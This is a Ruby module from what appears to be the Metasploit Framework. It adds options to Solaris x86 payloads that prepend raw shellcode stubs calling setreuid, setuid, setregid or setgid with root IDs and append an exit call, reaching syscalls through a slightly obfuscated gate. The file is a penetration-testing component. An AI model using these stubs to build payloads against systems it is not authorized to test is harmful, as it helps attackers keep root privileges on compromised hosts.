# -*- coding: binary -*-
require 'msf/core'

###
#
# This class is here to implement advanced features for solaris-based
# payloads. Solaris payloads are expected to include this module if
# they want to support these features.
#
###
module Msf::Payload::Solaris

  #
  # This mixin is chained within payloads that target the Solaris platform.
  # It provides special prepends, to support things like chroot and setuid.
  #
  def initialize(info = {})
    ret = super(info)

    register_advanced_options(
      [
        Msf::OptBool.new('PrependSetreuid',
          [
            false,
            "Prepend a stub that executes the setreuid(0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetuid',
          [
            false,
            "Prepend a stub that executes the setuid(0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetregid',
          [
            false,
            "Prepend a stub that executes the setregid(0, 0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('PrependSetgid',
          [
            false,
            "Prepend a stub that executes the setgid(0) system call",
            "false"
          ]
        ),
        Msf::OptBool.new('AppendExit',
          [
            false,
            "Append a stub that executes the exit(0) system call",
            "false"
          ]
        ),
      ], Msf::Payload::Solaris)

    ret
  end


  #
  # Overload the generate() call to prefix our stubs
  #
  def generate(*args)
    # Call the real generator to get the payload
    buf = super(*args)
    pre = ''
    app = ''

    test_arch = [ *(self.arch) ]

    # Handle all x86 code here
    if (test_arch.include?(ARCH_X86))

      # Syscall code
      sc = "\x68\xff\xd8\xff\x3c" + #   pushl   $0x3cffd8ff                #
           "\x6a\x65"             + #   pushl   $0x65                      #
           "\x89\xe6"             + #   movl    %esp,%esi                  #
           "\xf7\x56\x04"         + #   notl    0x04(%esi)                 #
           "\xf6\x16"               #   notb    (%esi)                     #

      # Prepend

      if (datastore['PrependSetreuid'])
        # setreuid(0, 0)
        pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
               "\x50"                 + #   pushl   %eax                       #
               "\x50"                 + #   pushl   %eax                       #
               "\xb0\xca"             + #   movb    $0xca,%al                  #
               "\xff\xd6"               #   call    *%esi                      #
      end

      if (datastore['PrependSetuid'])
        # setuid(0)
        pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
               "\x50"                 + #   pushl   %eax                       #
               "\xb0\x17"             + #   movb    $0x17,%al                  #
               "\xff\xd6"               #   call    *%esi                      #
      end

      if (datastore['PrependSetregid'])
        # setregid(0, 0)
        pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
               "\x50"                 + #   pushl   %eax                       #
               "\x50"                 + #   pushl   %eax                       #
               "\xb0\xcb"             + #   movb    $0xcb,%al                  #
               "\xff\xd6"               #   call    *%esi                      #
      end

      if (datastore['PrependSetgid'])
        # setgid(0)
        pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
               "\x50"                 + #   pushl   %eax                       #
               "\xb0\x2e"             + #   movb    $0x2e,%al                  #
               "\xff\xd6"               #   call    *%esi                      #
      end
      # Append

      if (datastore['AppendExit'])
        # exit(0)
        app << "\x31\xc0"             + #   xorl    %eax,%eax                  #
               "\x50"                 + #   pushl   %eax                       #
               "\xb0\x01"             + #   movb    $0x01,%al                  #
               "\xff\xd6"               #   call    *%esi                      #
      end

      # Prepend syscall code to prepend block
      if !(pre.empty?)
        pre = sc + pre
      end

      # Prepend syscall code to append block
      if !(app.empty?)
        app = sc + app
      end

    end

    return (pre + buf + app)
  end


end
